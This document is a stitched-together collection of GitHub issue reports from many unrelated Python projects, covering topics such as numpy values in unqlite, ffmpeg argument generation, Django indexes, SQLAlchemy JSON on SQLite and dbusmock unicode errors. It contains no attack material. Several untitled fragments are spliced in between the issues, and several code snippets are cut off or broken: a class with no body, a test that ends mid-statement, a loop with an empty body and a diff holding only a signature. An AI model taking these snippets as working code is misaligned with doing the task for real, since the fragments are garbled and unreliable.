If you're really hammering a rate limited call with multiple threads, the retry can also raise RateLimitException. I'm using this now, and might add a `max_retries` parameter

```python
def sleep_and_retry_forever(func):
    '''
    Return a wrapped function that retries rate limit exceptions, sleeping the
    current thread until rate limit resets. Continues to retry until the call makes
    it through.

    :param function func: The function to decorate.
    :return: Decorated function.
    :rtype: function
    '''
    @wraps(func)
    def wrapper(*args, **kargs):
        '''
        Call the rate limited function. If the function raises a rate limit
        exception sleep for the remaing time period and retry the function, until it succeeds.
        :param args: non-keyword variable length argument list to the decorated function.
        :param kargs: keyworded variable length argument list to the decorated function.
        '''
        done = False
        while not done:
            try:
                return func(*args, **kargs)
                done = True
            except RateLimitException as exception:
                time.sleep(exception.period_remaining)
    return wrapper
```

issue_title: Collections store None instead of numpy numbers
issue_body:
Hi! 
This problem arises because [numpy numbers][0] and [python numbers][1] have different datatypes. Specifically, I've noticed that __unqlite collections__ work fine with values of type `int`, but they fail to store values of type `numpy.uint8`.

- I can `collection.store` dictionaries that both look like this:
```
{'VI': 2, 'V': 1, 'VII': 3, 'IV': 0}
```
- The collections object stores them:
    - _Correctly_ if the values are of type`int`
    - __Not at all__  if the values are of type`np.uint8`
        - or _any numpy type_ such as uint16, int64, float32, etc

- An exact `numpy.uint8` test case runs like this
```python
import unqlite
import numpy as np
# Ignore this until I've made my point
from fancy_log_example import log

# Create in-memory database
mem_db = unqlite.UnQLite(':mem:')
collect = mem_db.collection('mem0')
collect.create()

# Store to mem_db collection
def store(keys, values):
    # Store keys and values as a dict
    entry = dict(zip(keys,values))
    print '    Storing:', entry
    # Store dict in your collection
    collect.store(entry)
    # defined below
    log(collect)

# Starwars keys and values
starwars_keys = ['IV','V','VI','VII']
starwars_values = [0, 1, 2, 3]

print 'Successfully store with int values:'
store(starwars_keys, starwars_values)

print 'Fail to store with numpy.uint8 values:'
store(starwars_keys, np.uint8(starwars_values))
```

- The output shows the __Main Issue__ and a potentially related _Side Note_:
```regex
Successfully store with int values:
    Storing: {'VI': 2, 'V': 1, 'VII': 3, 'IV': 0}
    Great values: [0, 1, 2, 3]
Fail to store with numpy.uint8 values:
    Storing: {'VI': 2, 'V': 1, 'VII': 3, 'IV': 0}
---------------------------------------------------------------------------
AssertionError                            Traceback (most recent call last)
..............
AssertionError: 
    Main Issue: values [None, None, None, None] for last id 1
    Side Note: current id is somehow still 0
```

- Finally, here's `fancy_log_example.py` so you can see
    - The values from log only come from legitimate uses of your API
    - I'm just `assert` expected behavior that `any` values are added

```python
def log(collect):
    # Get "last record" and "current record"
    last = collect.fetch(collect.last_record_id())
    current = collect.fetch_current()
    # Side Note: the current and last ids differ
    new_ids = last.pop('__id'), current.pop('__id')
    # Main Issue: ALL the added values have no value.
    added = sorted(last.values())
    assert any(added), '''
    Main Issue: values {} for last id {}
    Side Note: current id is somehow still {}
    '''.format(added, *new_ids)
    # Values are great for python int
    print '    Great values:', added
```

[0]: https://docs.scipy.org/doc/numpy/user/basics.types.html
[1]: https://docs.python.org/2.4/lib/typesnumeric.html


Please take time to respond to this. I can help you find out where to best fix this in your codebase if you only have time to supply a first impression of where `Collection` may be going wrong in storing numpy datatypes. Numpy ints or floats in particular __are very useful__ for optimization as they are always a fixed number of bytes. You may find [this particular method][2] `numpy.ndarray.tostring` useful for writing these such values to the database. 

Example:

```python
print np.uint32(1).tobytes()
# prints '\x01\x00\x00\x00'
```

Thanks for your time!

[2]: https://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.tostring.html

Instead of adding a list of ``PartialFormField``s named ``glossary_fields``, we now can add these

```python
class MyPlugin(CascadePluginBase):
```

issue_title: Pass-throughs should not use `-map`
issue_body:
This currently produces the wrong ffmpeg args:
```
>>> ' '.join(ffmpeg
...     .merge_outputs(
...         (ffmpeg
...             .input('in1.mp4')
...             .output('out1.mp4')
...         ),
...         (ffmpeg
...             .input('in2.mp4')
...             .output('out2.mp4')
...         )
...     )
...     .get_args()
... )
u'-i in1.mp4 -i in2.mp4 out1.mp4 -map [1] out2.mp4'
```

The `-map` should not be there, since no `-filter_complex` param is needed.

Should be fairly easy to fix by omitting `-map` for passthroughs and generating output params in the correct order.

See `test_multi_passthrough` in `feature/17` (or `master` once #17 is merged).

issue_title: Django Association model missing index
issue_body:
The [`Association` model](https://github.com/omab/python-social-auth/blob/df6d841bbcad0a800cc0cf1c4395e0cb2531aabb/social/apps/django_app/default/models.py#L88) inherits from DjangoAssociationMixin, which [performs a lookup when logging in](https://github.com/omab/python-social-auth/blob/master/social/storage/django_orm.py#L125-L126). This lookup relies on the `server_url` and `handle` columns.

Due to the lack of indices on these columns this lookup results in a full table scan, which is non-performant for applications with large user bases.

**Recommendations**

1. Add a compound index on the `server_url` and `handle` columns of the `Association` model.
2. Update the documentation recommending that those classes inheriting `DjangoAssociationMixin` include the same compound index.

issue_title: Add a depend() function to add a dependency to a test at runtime
issue_body:
This plugin defines the marker `@pytest.mark.dependency()` to mark a test as dependent on another test.  But there are cases when it's difficult to know the dependency in advance, it may turn out at run time of the test that it depends on another test.  So it would be handy to have some function `depends(other_tests)` that can be called from a test and would skip the running test if `other_tests` have not all been run successful.  So this new function would relate to the marker in a similar way as `pytest.skip()` relates to `@pytest.mark.skip()`.

A possible implementation might be:
```python
def depends(request, other_tests):
    DependencyManager.getManager(request.node).checkDepend(other_tests)
```

issue_title: Should the Python "global" statement be accepted and ignored?
issue_body:
In JS there isn't an equivalent of the `global` statement in Python: in a sense, a variable is automatically put in the global scope when it is not declared, so the following snippet behaves differently when run under Python than under JS:
```
some_global = None

def get_global():
    if some_global:
        return some_global
    # compute it
    some_global = 'foo'
    return some_global
```

Python itself would raise an `UnboundLocalError`, while pyflakes reports `local variable 'some_global' (defined in enclosing scope on line 1) referenced before assignment`.

So I wonder whether `pj` could/should allow me to put a `global` statement in that function, adding a null-transform for its node type, in other words simply ignoring the declaration. It would be a bonus if it could even check for the existence of those global(s), just to avoid typos...

- Could it be that when retrieving the connections from the pool to close them, actually new ones are generated?
- Wouldn't it be enough to invoke `urllib3.connectionpool.HttpConnectionPool.close()` , like that?
```diff
    def close_socket(self, url):
```

issue_title: cprofile doesn't use setup
issue_body: When using cprofile it re-runs the `target` method without first running `setup` ([see code](https://github.com/ionelmc/pytest-benchmark/blob/master/src/pytest_benchmark/fixture.py#L225)). For methods that mutate an arg this means the cprofile returns incorrect results for the benchmark.

issue_title: Split search term by whitespaces
issue_body:
Hi.

I've made some adjustments to the get_query() method in the ModelLookup class:

```
def get_query(self, request, term):
        qs = self.get_queryset()
        if term:
            search_filters = []
            if self.search_fields:
                for t in term.split():
                    for field in self.search_fields:
                        search_filters.append(Q(**{field: t}))
            qs = qs.filter(reduce(operator.or_, search_filters))
        return qs
```

It allows users to enter more terms in one go, for instance, name & surname. It's a bit slower than the original, obviously, but not that much from what I've noticed.

Could something like this find it's way into the package? If you think it could, I could write it better (keep the old behaviour as default, but add an option for this).

Cheers,
Dinko M.

issue_title: Add support for "immutable" Cache-Control header
issue_body:
Hey @etianen, something that Whitenoise supports is adding the "immutable" value to the Cache-Control header for static files with hashed filenames. It looks like you already added support for caching hashed files longer, so why not add this wonderful feature?

See here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control and here: http://bitsup.blogspot.de/2016/05/cache-control-immutable.html

I imagine it would be something like a new option: `AWS_S3_IMMUTABLE_CACHED_STATIC = True`.

Would you be open to me submitting a PR?

issue_title: Modify syntax for gp.predict() in concert with sklearn 0.18
issue_body:
Hi there,

Minor issue, but in playing with the visualization notebook in Jupyter, it appears that minor changes to sklearn syntax in 0.18 have broken the tutorial (related to the posterior() function definition).  

I was able to fix this as follows (I'm showing posterior_old() for the sake of comparison).  It appears that eval_MSE has been deprecated, and instead return_std may be specified to get the standard deviation.


```
def posterior_old(bo, xmin=-2, xmax=10):
    xmin, xmax = -2, 10
    bo.gp.fit(bo.X, bo.Y)
    mu, sigma2 = bo.gp.predict(np.linspace(xmin, xmax, 1000).reshape(-1, 1), eval_MSE=True)
    return mu, np.sqrt(sigma2)

def posterior(bo, xmin=-2, xmax=10, n_points=1000):
    xmin, xmax = -2, 10
    bo.gp.fit(bo.X, bo.Y)
    mu,std = bo.gp.predict(np.linspace(xmin, xmax, n_points).reshape(-1, 1), return_std=True)
    return mu, std
```

issue_title: JSON for SQLite
issue_body:
I try to extend the JSONType to support the Postgres syntax of in querying for an item inside the JSON: 

```
import sqlalchemy.types as types
import six
from sqlalchemy import UnicodeText
from sqlalchemy import Column, Integer, Text, create_engine, MetaData
from sqlalchemy.ext.declarative import declarative_base  
from sqlalchemy.orm import sessionmaker
from sqlalchemy import Table, table
from sqlalchemy import Column, Integer, Text  
import json  


# https://sqlalchemy-utils.readthedocs.io/en/latest/data_types.html#module-sqlalchemy_utils.types.json
class JSONType(types.TypeDecorator):
    """
    JSONType offers way of saving JSON data structures to database. On
    PostgreSQL the underlying implementation of this data type is 'json' while
    on other databases its simply 'text'.

    ::


        from sqlalchemy_utils import JSONType


        class Product(Base):
            __tablename__ = 'product'
            id = sa.Column(sa.Integer, autoincrement=True)
            name = sa.Column(sa.Unicode(50))
            details = sa.Column(JSONType)


        product = Product()
        product.details = {
            'color': 'red',
            'type': 'car',
            'max-speed': '400 mph'
        }
        session.commit()
    """
    impl = UnicodeText

    def __init__(self, *args, **kwargs):
        if json is None:
            raise ImproperlyConfigured(
                'JSONType needs anyjson package installed.'
            )
        super(JSONType, self).__init__(*args, **kwargs)

    def load_dialect_impl(self, dialect):
        if dialect.name == 'postgresql':
            # Use the native JSON type.
            if has_postgres_json:
                return dialect.type_descriptor(JSON())
            else:
                return dialect.type_descriptor(PostgresJSONType())
        else:
            return dialect.type_descriptor(self.impl)

    def process_bind_param(self, value, dialect):
        if dialect.name == 'postgresql' and has_postgres_json:
            return value
        if value is not None:
            value = six.text_type(json.dumps(value))
        return value

    def process_result_value(self, value, dialect):
        if dialect.name == 'postgresql':
            return value
        if value is not None:
            value = json.loads(value)
        return value


connection_string = 'sqlite:///sqlite.db'
db = create_engine(connection_string)  
engine = db.connect()  
meta = MetaData(engine) 
Table("jsontable", meta,  
      Column('id', Integer),
      Column('name', Text),
      Column('email', Text),
      Column('doc', JSONType))
meta.create_all()  
j_table = table(
        "jsontable", Column('id', Integer),
        Column('name', Text),
        Column('email', Text),
        Column('doc', JSONType))
statement = j_table.insert().values(
        id=3,
        name="Mr. Params",
        email="use@params.com",
        doc={
            "dialect": "params",
            "address": {"street": "Main St.", "zip": 12345},
        },
    )
engine.execute(statement)
find_user = j_table.select().where(j_table.c.name == "Mr. Params")
print(engine.execute(find_user).fetchone())

find_zip = j_table.select().where(
        j_table.c.doc[
            ('address', 'zip') # specify the path as a tuple/list of keys
        ].cast(
            sqlalchemy.Integer # zip codes are stored as numbers, cast the query
        ) == 12345) # finally, the zip we're looking for

print(engine.execute(find_zip).fetchone())

```


I get the following error message: 
`NotImplementedError: Operator 'getitem' is not supported on this expression`

So it seems I have to extend `JSONType.Comparator `like it is done in: https://github.com/zzzeek/sqlalchemy/blob/master/lib/sqlalchemy/sql/sqltypes.py 

Basically what I want to do is loading the full dictionary from SQLite as text then convert it and answer the sqlalchemy query, so any tip or hint would be very much appreciated.

issue_title: New constants for season 6
issue_body:
The first one I've discovered is `TEAM_BUILDER_DRAFT_RANKED_5x5` as a possible value for queue types. This is a valid value for the `rankedQueues` param of Riot's API. It also appears as a value in Match and MatchList responses.

There is also `TEAM_BUILDER_DRAFT_UNRANKED_5x5`. See https://developer.riotgames.com/docs/game-constants

As a side note, it appears that sending rankedQueues=TEAM_BUILDER_DRAFT_RANKED_5x5 to the matchlist endpoint results in a response containing ranked solo, 5s and dynamic queue matches.

I don't use the constants from riotwatcher, but if I feel I've found all the changes (these 2 may very well be it) I will submit a PR.

issue_title: MKL in conda, compilation error
issue_body:
In my py2.7 conda environment that is linked with MKL, numpy_sys.get_info("blas") throws a distutils.errors.LinkError. I was able to use Pythran by changing the following lines around line.92 of config.py:
`
        numpy_blas = numpy_sys.get_info("blas")
`
to

```
        try:
            numpy_blas = numpy_sys.get_info("blas")
        except LinkError:
            numpy_blas = numpy_sys.get_info("mkl")
```

issue_title: Explicitly create Threads instead of implicitly?
issue_body:
Threading is a complicated subject and it can lead to difficult to track bugs.
By default TeleBot creates a new Thread for each registered listener and each registered message handler. Now, if two message handlers or two listeners try to access the same (not thread-safe) resource, the programmer has got a problem. So unless the programmer is aware that this library creates Threads (and knows how to handle them (locks, semaphores, queues)), Threads can be a threat ( :) ) to the stability of bots.
My proposal: 
Create an optional ```create_threads``` parameter for the TeleBot constructor, which defaults to ```False```.
Check for this parameter when calling listeners or message handlers:
```python
if self.create_threads:
    t = threading.Thread(target=message_handler, args=message)
    t.start()
else:
    message_handler(message)
```

The drawback of this is of course program speed. The bot will block until a listener or message handler has returned. Until then the bot cannot receive new messages. But my estimation is that this drawback is less important than the overhead (for the, especially novice, programmer) of creating Threads. With an optional argument, the programmer can decide for himself whether he wants to go down the dangerous road of multithreading.
Is my reasoning correct?

issue_title: RDDComparisons Assert Doesn't Fail
'string signature' under python 2
issue_body:
When running ``dbusmock`` under python 2 unicode strings passed to a mocked method cause an error when they contain characters that can not be encoded using ascii.

According to the [dbus docs](https://dbus.freedesktop.org/doc/dbus-python/api/dbus.String-class.html) dbus strings that can be specified in a signature default to unicode, if the ``utf8_strings`` kwarg has not been set to ``True`` in the method decorator.

When passing such a unicode string containing non ascii chars to a mocked method with ``in_sig='s'`` the following error occurs:

```
E       DBusException: org.freedesktop.DBus.Python.UnicodeEncodeError: Traceback (most recent call last):
E         File "/usr/lib/python2.7/dist-packages/dbus/service.py", line 707, in _message_cb
E           retval = candidate_method(self, *args, **keywords)
E         File "/home/elbenfreund/.virtualenvs/hamster-dbus/local/lib/python2.7/site-packages/dbusmock/mockobject.py", line 330, in <lambda>
E           self, interface, name, in_sig, *args, **kwargs)
E         File "/home/elbenfreund/.virtualenvs/hamster-dbus/local/lib/python2.7/site-packages/dbusmock/mockobject.py", line 551, in mock_method
E           self.log(dbus_method + self.format_args(args))
E         File "/home/elbenfreund/.virtualenvs/hamster-dbus/local/lib/python2.7/site-packages/dbusmock/mockobject.py", line 599, in format_args
E           s += format_arg(a)
E         File "/home/elbenfreund/.virtualenvs/hamster-dbus/local/lib/python2.7/site-packages/dbusmock/mockobject.py", line 578, in format_arg
E           return '"' + str(a) + '"'
E       UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-9: ordinal not in range(128)
```

At a first glance this seems to be due to the use of ``str`` in L578 which means something different between py2 and py3. Maybe using ``six.text_type`` or something similar can avoid a forced type conversion here?

Please let me know if I can provide any further information to help sorting this issue
Eric

issue_title: Incorrect handling for LOGOUT_URL
issue_body:
Django's [LOGIN_URL](https://docs.djangoproject.com/en/1.10/ref/settings/#login-url) etc. settings can be absolute paths or named URLs.  In stronghold, LOGOUT_URL is always treated as an absolute path.  If someone provides a LOGOUT_URL value as `user:logout`.  It gets translated to regular expression such `^user:logout$` to be matched against request.path_info.

Django itself handles these URLs with `django.shortcuts.resolve_url` which resolves both named URLs and absolute paths properly.

issue_title: Model schema is missing from swagger-ui in some special case.
issue_body:
I am describing the response model of an endpoint using the `api.marshal_with` and `api.model` functions.

The desired model is:
```python
speed_statistics_sample = api.model('SpeedSample', {
    'timestamp': fields.DateTime(),
    'rate': fields.Float()
})

speed_statistics_period = fields.List(fields.Nested(speed_statistics_sample))

speed_statistics_link = api.model('LinkSpeed', {
    'rx': speed_statistics_period,
    'tx': speed_statistics_period
})
```

However on the swagger-ui it cannot decode the nested models. On `Model Schema` page thefields `rx` and `tx` says `null`, while on `Model` page it understands that depends on `SpeedSample` model, it does not provide its information:
![model_missing](https://cloud.githubusercontent.com/assets/3830635/5615303/c1c676b0-9502-11e4-8005-992f1ef01c63.png)
![model_schema_missing](https://cloud.githubusercontent.com/assets/3830635/5615300/b99edf2c-9502-11e4-9d02-2976a91abc88.png)

---
The wierd thing is that if I change a bit the api and remove the `List` field for one member, everything is fixed, though this is not the desired model that I want to describe.

```python
speed_statistics_sample = api.model('SpeedSample', {
    'timestamp': fields.DateTime(),
    'rate': fields.Float()
})

speed_statistics_period = fields.List(fields.Nested(speed_statistics_sample))

speed_statistics_link = api.model('LinkSpeed', {
    'rx': fields.Nested(speed_statistics_sample),
    'tx': speed_statistics_period
})
```

Then the swagger-ui is working as expected:
![model](https://cloud.githubusercontent.com/assets/3830635/5615403/9f408184-9503-11e4-8731-d9d3e1069920.png)
![model_schema](https://cloud.githubusercontent.com/assets/3830635/5615404/a0aa7692-9503-11e4-9c9c-7dd7cdbd9004.png)


Notice, that marshaling was perfect on all cases, it is only an issue of documentation.

issue_title: missing queryset.model ?
issue_body:
View
```py
from django.shortcuts import get_object_or_404
from rest_framework import viewsets
from rest_framework.response import Response
from app.authentication import FirebaseAuthentication
from app.models import User
from app.serializers import UserSerializer

class UserViewSet(viewsets.ModelViewSet):
    queryset = User.objects.all()
    serializer_class = UserSerializer

    def retrieve(self, request, pk=None):
        queryset = User.objects.all()
        user = get_object_or_404(queryset, pk=pk)
        serializer = UserSerializer(user)
        return Response(serializer.data)
```

Test
```py
def generate_fake_user(pk, name):
    return {
        'pk': pk,
        'email': '{}@example.com'.format(name),
        'password': 'password{}'.format(name),
    }

class UserViewSetTestCase(TestCase):
    users = MockSet(
        User(**generate_fake_user(1, 'A')),

        'app.models.user.User.objects.all',

        request.user = AnonymousUser()
        result = UserViewSet().retrieve(request)
```

This raises

issue_title: Upcoming refactor: building hvad2
issue_body:
**django-hvad** will undergo its second major refactor soon. There is no release schedule yet, but I would expect it in a couple of months.

This issue will track ongoing work.

- [ ] **Clean up code**: drop all obsolete code:
    * Code to support Django < 1.8.
    * Code to support Python < 2.7
    * Code to support obsolete FallbackQueryset (that has been replaced with `.fallbacks()`).
    * Code to give details information about deprecation errors.
- [ ] **Namespace settings**: move hvad settings to `settings.HVAD`.
- [ ] **Extra restriction based queries**: refactor query building to use an INNER JOIN with extra constrain instead of patching fields dynamically.
    * [ ] Deep `select_related()` rework to leverage the INNER JOIN.
- [ ] **Prevent creation of untranslated objects** (see #249).
- [ ] **Switch back TranslationQueryset.model to shared model** (see #249).
- [ ] **Formalize interactions of `translations` cache**, so hvad takes full control of it.
- [ ] **Get rid of TranslationAwareQueryset**. Instead, enable `TranslationQueryset` to work on non-translatable models as well.
- [ ] **Refactor admin**
    * todo

*Should you want to look at current state, it is available as the `dev/hvad2` branch. As I am working alone atm, I occasionally rewrite history, so if you fill like lending a hand, please tell me first so I don't mess up your git tree.*

issue_title: Invalidate translation accessor cache on serializer save
issue_body:
When an instance is given to a serializer inheriting `hvad.contrib.restframework.TranslationsMixin`, and it is saved, all its translations are updated. New ones are created and old ones are deleted.

Now, if the instance has pre-loaded translations set on it, they get out of sync. Although it is the expected behavior according to how Django's relation accessors work, it feels wrong and error-prone that `instance.get_available_languages()` returns an outdated list.

Therefore the serializer should either update or invalidate the pre-loaded translations cache when it saves its instance.

issue_title: Callback blocked into another callback
issue_body:
Hello !

I just noticed some unexpected behavior on the library. Code will better explain that word.
```
def callback(msg):
	# do something
	socketIo.emit('test2', {"test2": "test2"}, callback=callbackAsk)
	wait()
	
def callbackAsk(data):
	print("receive ask response", data)
	lastDataReceived = data

	wakeUp()

def wait():
	cv.acquire()

	inTime = False

	inTime = cv.wait(3)

	if not inTime:
		print("ASK TIMEOUT")
		lastDataReceived = None

	dataReceived = False

	cv.release()

def wakeUp():
	cv.acquire()
	dataReceived = True
	cv.notify()
	cv.release()

socketIo.on('test', callback)

dataReceived = False
cv = threading.Condition()

socketIo.emit('test', {"test":"test"})

socketIo.wait()
```

This code is a simplification, no tested of mine (I use a Client class with a lot more function) but it show what I want to explain.

Here the first emit work well but the second one not. The second one that is a synchrone call time out and after the first callback thread is killed callbackAsk is called. If the synchrone function is not called in a socketio callback it's working.

I think it's because we already are on a socket io callback thread so the library need to finish the first one before calling the second one. But that broke my synchronous call inside socket io callback. 

For informations if I do 
` _thread.start_new_thread(socketIo.emit, ('test2', {"test2": "test2"}), {"callback":callbackAsk})`

It work but in my software architecture this block me to have my synchronous data.

I will try some change on my software architecture to have something working. I just let this message for let you know this behavior and maybe fix it if your software architecture allow you to launch all callback in separate thread.

issue_title: Wheel support
issue_body:
http://pythonwheels.com/

Right now, only the `tar.gz` file is being distributed on PyPI for [email_validator](https://pypi.python.org/pypi/email_validator), which isn't _that much_ of an issue, but it does add some time to installing the package.

This package should be compatible with the Wheel format, considering it doesn't appear to have any C dependencies and it is compatible with both Python 2 and 3. As a result, you should only need to generate a universal wheel and then everyone (on all systems) will get the ability to install email_validator with just the wheel, without having to do any extra work.

issue_title: IBAN comparison with other apps is not correct
issue_body:
Hi, Great work on this module. I'm probably going to use the VAT field in my project.

I'm the author of django-iban which was the basis for the django-localflavor IBAN and BIC fields. Your comparison documentation is not correct and it would be nice to have this corrected.
```
This module also supports a IBANField, but does not validate against regular expressions, rather validating the length of the IBAN for each country code. The validation provided by :mod:`internationalflavor` is more extensive by using regular expressions.
```
The IBAN fields in django-localflavor does in fact check the length for the specific country but it also does a full checksum validation as per the official IBAN validation guide (just like your code).

https://github.com/django/django-localflavor/blob/1.1/localflavor/generic/validators.py#L111

As far as I can see, there is no real functional difference between your version and the version in django-localflavor. But I would love to work together on making the django-localflavor version better if there is a problem with it. The reason I contributed the code to django-localflavor was so that there could be a community maintained version of this validation rather than a bunch of solo devs trying to hack this out on our own.

```
Additionally, we provide a :class:`BICField` for SWIFT BIC validation.
```
This is also not correct. django-localflavor has a BICField as well.

https://github.com/django/django-localflavor/blob/1.1/localflavor/generic/models.py#L55

Like I said, if there is a problem with the localflavor versions of the IBAN or BIC fields, I would be very happy to see a bug report or review a PR against django-localflavor. At the very least, your documentation should be updated to accurately reflect the differences between the two versions (which seems to be nothing).

issue_title: Use Variables in Key when Writing Secrets
issue_body:
**What**
It appears that when writing a secret, the key you are writing cannot be or contain an ansible variable. 

**Example**
- name: Store some password in HVAULT
  hashivault_write:
    url: "{{HVAULT_URL}}"
    verify: false
    authtype: userpass
    username: ansible
    password: "{{HVAULT_PASS}}"
    secret: '{{Group|upper}}/{{Env_Tier|upper}}'
    data:
      **"someuser{{ User_Suffix }}"**: "{{ someuser_Password }}"
  delegate_to: localhost

**Expected Results**

under- 
data:
**"someuser{{ User_Suffix }}"**: "{{ someuser_Password }}"

The module should be able to append whatever the value of {{User_Suffix}} is to the key it writes in Hashicorp Vault.  So if the value of {{User_Suffix}} is `P` the module should write the secret in Vault as `someuserP`.

**Actual Results**
In testing, the module is writing the literal string `someuser{{ User_Suffix }}` as the KEY in Vault, even though the secret is correctly written in Vault as the variable value.

it use **data_shape** as the key of `Map`.

```
from gluoncv import model_zoo
from mxnet import nd, gluon
import mxnet as mx

def forward_mxnet(model_name, image):
    net = model_zoo.get_model(model_name, pretrained=True, prefix='%s_' % model_name.replace('.', 'dot'))
    input_symbols = mx.sym.var('data')
    output_symbol = net(input_symbols)
    internals = output_symbol.get_internals()
    output_names = internals.list_outputs()
    output_symbols = [internals[name] for name in output_names]
    params = net.collect_params()
    model = gluon.SymbolBlock(output_symbols, input_symbols, params=params)
    outputs = model(image)
    output_blobs = dict()
    for name, output in zip(output_names, outputs):
        if name.find('_output') >= 0:

    return output_blobs, params
```

issue_title: Incorrect child absolute_uri values generated from base_uri.
issue_body:
Passing the original url as the base_uri input parameter to M3U8 constructor (as the description in its help text describes) makes incorrect absolute_uri paths for the child objects.

This code exercises the problem against one of Apple's sample streams:
```
$ python
Python 2.7.6 (default, Sep  9 2014, 15:04:36) 
[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.39)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib2, m3u8, urlparse
>>> url='https://devimages.apple.com.edgekey.net/streaming/examples/bipbop_4x3/bipbop_4x3_variant.m3u8'
>>> text=urllib2.urlopen(url).read()
>>> m=m3u8.M3U8(content=text, base_uri=url)
>>> m.playlists[0].absolute_uri
```

issue_title: Dropout applied twice before LSTM inputs
issue_body:
As per my note on mozilla/#machinelearning:

`BiRNN` applies dropout after the third layer:

```
    layer_3 = tf.nn.dropout(layer_3, (1.0 - dropout[2]))
```

`layer_3` is then used as input to the bidirectional rnn:

```
    outputs, output_states = tf.nn.bidirectional_dynamic_rnn(cell_fw=lstm_fw_cell,
                                                             cell_bw=lstm_bw_cell,
                                                             inputs=layer_3,
                                                             dtype=tf.float32,
                                                             time_major=True,
                                                             sequence_length=seq_length)
```

However both `lstm_fw_cell` and `lstm_bw_cell` have a: 

```
    lstm_fw_cell = tf.contrib.rnn.DropoutWrapper(lstm_fw_cell,
                                                input_keep_prob=1.0 - dropout[3],
                                                output_keep_prob=1.0 - dropout[3],
                                                seed=FLAGS.random_seed)
```

```
    lstm_bw_cell = tf.contrib.rnn.DropoutWrapper(lstm_bw_cell,
                                                input_keep_prob=1.0 - dropout[4],
                                                output_keep_prob=1.0 - dropout[4],
                                                seed=FLAGS.random_seed)
```


which applies dropout to the inputs also meaning that dropout will be applied again to `layer_3`. 

As noted by gerard-majax `dropout_rate[4]` is by default set to 0.0 so this likely only effects `lstm_fw_cell` which defaults to `dropout_rate` unless the hyperparameters have been changed otherwise.

I believe this results in an effective `keep_prob=(1.0 - dropout[2]) * (1.0 - dropout[3])` for `lstm_fw_cell`.

issue_title: account.billing_info raises AttributeError on new accounts.
issue_body:
Repeat of #98, but I'm having this occur in 2.2.17. I should note I'm on python 3.5.0, just in case.

Using the example in the docs for creating a new account, and then a new billing info object:

```py
account = Account(account_code='1')
account.email = 'verena@example.com'
account.first_name = 'Verena'
account.last_name = 'Example'
account.save()

# account.billing_info here raises AttributeError, 
# so I copy-paste the example code exactly, including the get.

account = Account.get('1')
billing_info = account.billing_info #  but this still raises an AttributeError!
billing_info.token_id = 'TOKEN_ID'
billing_info.save()
```

I seem to have been able to resolve this by calling `account.update_billing_info` with a new BillingInfo object I create and add the token to, like so:

```py
account = Account.get('1')
billing_info = BillingInfo()
billing_info.token_id = 'TOKEN_ID'
account.update_billing_info(billing_info)
```

Before I arrived to the solution above, I also tried attaching the billing info object I created to the account and saving it, but that raised an unrelated AttributeError, so I didn't continue down that path. 

While I have a solution that works for me as-is, I'm curious as to whether this is intended to be used this way, or if I'm going against the grain, since the example differed from my implementation. 

Thanks for your time!

issue_title: Write tests involving models with TaxedMoneyField and save()/delete() calls
issue_body:
During work on updating Saleor's codebase to use current prices, I've ran into plenty of edge cases with Django ORM accessing different attributes on `TaxedMoneyField` instances when running different operations.

Those could've been found much sooner if our test suite included following scenarios:

1. `model.save()`
2. `model.save(update_fields)`
3. `model.delete()`

We should also explore how behavior of those changes for models that are:

1. pointed to by `ForeignKey` in other model
2. are pointing to other model via `ForeignKey`

This is because Django's ORM appears to look up related models fields, iterating on them and snooping out different attrs for its checks and validations.

issue_title: Reference to HasTraits object inside the contained Trait object?
issue_body:
This is not really an issue, more like a general question.
I am creating a small module for generating Qt controllers to control traits corresponding to parameters in an interface. I would have a new trait inside the controller object linked to the original one, something like:

```python
import traitlets as tr

class FirstClass(tr.HasTraits):
    i = tr.Integer(5, min=3, max=5)


class SecondClass(tr.HasTraits):
    j = tr.Integer()

    def __init__(self, has_traits_obj, name):
        tr_obj =  has_traits_obj.traits()[name]

        for k in tr_obj.metadata.keys():
            self.traits()['j'].set_metadata(k, tr_obj.metadata[k])
        tr.link((has_traits_obj, name), (self, 'j'))
        
        
first_obj = FirstClass()
second_obj = SecondClass(first_obj, 'i')
```


In doing this, I realized that I cannot instantiate the controller from the Trait object alone because there is no reference to its HasTraits object container, only to the class. 

```python
# I would like to have instead
second_obj = SecondClass(first_obj.traits()['i'])
# But I don't find reference to first_obj in first_obj.traits()['i']
```

Obviously I can work around it passing the (HasTraits, 'name') tuple, but the point is: why not allowing to link from the Trait object alone by having in it a reference to the HasTraits object which contains it? This may be a naive question - is there some general conceptual error I am making here?
